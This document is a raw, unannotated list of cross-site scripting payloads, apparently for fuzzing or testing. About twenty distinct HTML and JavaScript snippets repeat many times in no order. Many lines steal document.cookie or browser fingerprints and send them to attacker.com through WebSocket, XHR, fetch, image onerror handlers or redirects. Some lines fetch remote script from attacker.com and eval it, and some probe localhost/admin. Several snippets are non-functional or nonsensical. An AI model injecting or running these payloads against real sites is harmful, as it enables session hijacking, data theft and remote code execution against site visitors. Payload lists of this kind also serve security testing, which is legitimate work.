<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
